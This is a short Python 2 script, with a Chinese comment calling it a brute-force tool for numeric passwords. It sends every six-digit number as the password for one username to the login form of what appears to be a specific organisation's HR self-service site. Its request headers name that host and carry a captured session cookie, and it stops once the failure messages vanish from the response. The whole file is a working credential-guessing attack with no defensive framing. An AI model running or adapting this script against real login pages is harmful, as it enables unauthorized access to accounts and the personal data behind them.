# -*- coding: utf-8 -*-
'''
暴力破解数字密码
'''
import urllib
import urllib2
url = '' # 登录页面url
for x in range(1,999999):
    try:
		values = {'logname':'username','logpwd':'%06d' %x,'mlang':'2','SUBMIT':'Submit'}
		data = urllib.urlencode(values)
		headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
		"Accept-Encoding":"gzip, deflate",
		"Accept-Language":"zh-CN,zh;q=0.8",
		"Cache-Control":"max-age=0",
		"Connection":"keep-alive",
		"Content-Length":"%s" %len(data),
		"Content-Type":"application/x-www-form-urlencoded",
		"Cookie":"JSESSIONID=7f0000011f9047f85175e9ce45ecbac2f2eb0d94e01a",
		"Host":"hr.bmei.net.cn",
		"Origin":"http://hr.bmei.net.cn",
		"Referer":"http://hr.bmei.net.cn/ess/index.do",
		"Upgrade-Insecure-Requests":"1",
		"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.103 Safari/537.36"}
		print data
		req = urllib2.Request(url, data, headers=headers)
		response = urllib2.urlopen(req)
		the_page = response.read()
		if the_page.find('Invalid User ID or Password') < 0 and the_page.find('Error ID') < 0:
			break;
    except:
        continue
print the_page
